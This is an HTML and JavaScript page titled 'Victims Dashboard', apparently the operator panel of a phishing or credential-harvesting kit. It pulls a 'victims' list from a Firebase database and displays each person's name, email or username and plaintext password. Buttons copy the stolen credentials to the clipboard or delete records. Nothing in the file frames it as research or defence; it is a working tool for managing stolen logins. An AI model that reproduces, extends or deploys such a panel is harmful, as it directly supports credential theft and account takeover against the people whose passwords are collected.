<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Victims Dashboard</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
        }
        header {
            background: #333;
            color: #fff;
            padding: 15px;
            text-align: center;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            background: white;
            margin-top: 20px;
        }
        th, td {
            border: 1px solid #ddd;
            padding: 10px;
            text-align: left;
        }
        th {
            background: #444;
            color: white;
        }
        tr:nth-child(even) {
            background: #f2f2f2;
        }
        button {
            padding: 5px 10px;
            margin: 2px;
            border: none;
            cursor: pointer;
            border-radius: 3px;
        }
        .view-btn { background: #2196F3; color: white; }
        .copy-btn { background: #4CAF50; color: white; }
        .delete-btn { background: #f44336; color: white; }
    </style>
</head>
<body>
    <header>
        <h1>Victims Dashboard</h1>
    </header>

    <table id="victimsTable">
        <thead>
            <tr>
                <th>Name</th>
                <th>Email / Username</th>
                <th>Password</th>
                <th>Extra Data</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody></tbody>
    </table>

    <!-- Firebase App (core SDK) -->
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <script>
        // TODO: Replace with your Firebase config
        const firebaseConfig = {
            apiKey: "YOUR_API_KEY",
            authDomain: "YOUR_AUTH_DOMAIN",
            databaseURL: "YOUR_DATABASE_URL",
            projectId: "YOUR_PROJECT_ID",
            storageBucket: "YOUR_STORAGE_BUCKET",
            messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
            appId: "YOUR_APP_ID"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.database().ref("victims");

        function loadVictims() {
            db.on("value", snapshot => {
                const tbody = document.querySelector("#victimsTable tbody");
                tbody.innerHTML = "";
                snapshot.forEach(childSnapshot => {
                    const victim = childSnapshot.val();
                    const id = childSnapshot.key;

                    const tr = document.createElement("tr");
                    tr.innerHTML = `
                        <td>${victim.name || ''}</td>
                        <td>${victim.email || victim.username || ''}</td>
                        <td>
                            <input type="text" value="${victim.password || ''}" readonly style="border:none; background:transparent; width:100px;">
                        </td>
                        <td>${victim.extra || ''}</td>
                        <td>
                            <button class="view-btn" onclick="viewVictim('${id}')">View</button>
                            <button class="copy-btn" onclick="copyVictim('${victim.email || victim.username || ''}', '${victim.password || ''}')">Copy</button>
                            <button class="delete-btn" onclick="deleteVictim('${id}')">Delete</button>
                        </td>
                    `;
                    tbody.appendChild(tr);
                });
            });
        }

        function viewVictim(id) {
            window.location.href = `form.html?id=${id}`;
        }

        function copyVictim(username, password) {
            const text = `Username: ${username} | Password: ${password}`;
            navigator.clipboard.writeText(text).then(() => {
                alert("Copied to clipboard");
            });
        }

        function deleteVictim(id) {
            if (confirm("Are you sure you want to delete this victim?")) {
                db.child(id).remove();
            }
        }

        loadVictims();
    </script>
</body>
</html>
